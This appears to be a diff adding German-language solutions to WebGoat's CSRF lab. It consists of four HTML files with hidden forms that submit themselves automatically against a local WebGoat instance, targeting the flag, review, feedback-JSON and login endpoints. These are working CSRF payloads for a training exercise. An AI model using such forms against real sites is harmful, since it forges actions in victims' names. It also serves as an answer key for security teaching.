@@ -1,0 +1,25 @@
+1. HTML Datei mit folgendem Inhalt erstellen:
+<form name="form" action="http://127.0.0.1:8080/WebGoat/csrf/basic-get-flag" method="POST"></form>
+<script>document.form.submit();</script>
+
+2. HTMl Datei mit folgendem Inhalt erstellen:
+<form name="form" action="http://127.0.0.1:8080/WebGoat/csrf/review" method="POST">
+    <input type="hidden" name="reviewText" value="Wow this is so cool">
+    <input type="hidden" name="stars" value="1">
+    <input type="hidden" name="validateReq" value="2aa14227b9a13d0bede0388a7fba9aa9">
+</form>
+<script>document.form.submit();</script>
+
+3. HTMl Datei mit folgendem Inhalt erstellen:
+<form name="form" enctype="text/plain" action="http://127.0.0.1:8080/WebGoat/csrf/feedback/message" method="POST">
+    <input type="hidden"
+        value='{"name": "TestName", "email": "test@test.com", "subject": "service", "message":"Tests"}'>
+</form>
+<script>document.form.submit();</script>
+
+4. HTMl Datei mit folgendem Inhalt erstellen:
+<form name="form" action="http://127.0.0.1:8080/WebGoat/login" method="POST">
+    <input type="hidden" name="username" value="csrf-test-user">
+    <input type="hidden" name="password" value="test-user">
+</form>
+<script>document.form.submit()</script>
